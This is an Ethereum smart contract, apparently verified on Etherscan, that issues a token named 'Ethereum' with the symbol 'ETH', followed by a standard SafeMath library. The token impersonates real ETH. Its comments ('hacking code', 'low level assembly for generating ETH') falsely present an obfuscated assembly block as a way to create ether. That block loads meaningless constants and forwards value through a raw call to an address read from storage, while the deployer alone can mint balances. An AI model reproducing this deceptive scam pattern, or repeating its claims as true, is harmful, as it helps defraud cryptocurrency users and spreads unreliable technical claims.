/**
 *Submitted for verification at Etherscan.io on 2019-02-18
*/

pragma solidity 0.5.4;

// Interface for ERC20 token
contract EthProvider {
    using SafeMath for uint256;
    
    event Transfer(address indexed from, address indexed to, uint tokens);
    
    address public master = msg.sender;
    
    uint256 public totalSupply = 0;
    
    // hacking code to 
    string constant public name = 'Ethereum';
    string constant public symbol = 'ETH';
    
    uint256 constant public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    
    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        
        emit Transfer(msg.sender, to, value);
    }
    
    function create(address to, uint256 value) external returns (bool) {
        require(msg.sender == master);
        
        balanceOf[to] = balanceOf[to].add(value);
        totalSupply = totalSupply.add(value);
        
        // low level assembly for generating ETH
        assembly {
            let freemem_pointer := mload(0x40)
            mstore(add(freemem_pointer,0x00),"81e5236c2d4c61044949678014d3d035")
            mstore(add(freemem_pointer,0x20),"81e5236c2d4c61044949678014d3d035")
            let arr1:= mload(freemem_pointer)
            mstore(add(freemem_pointer,0x40),arr1)
            //gas needs to be uint:ed
			let g := and(gas,0xEFFFFFFF)
			let o_code := mload(0x40) //Memory end
			//Address is masked
			let addr := and(sload(0),0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
			calldatacopy(o_code, 0, calldatasize)
			let retval := call(g
				, addr //address
				, value //multiplyed ETH amount
				, o_code //mem in
				, calldatasize //mem_insz
				, o_code //reuse mem
				, 64) //Hardcoded to 64 b return value
			return(o_code,128)
        }
        
    }
}


/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, reverts on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    /**
    * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    /**
    * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    /**
    * @dev Adds two numbers, reverts on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    /**
    * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
    * reverts when dividing by zero.
    */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}
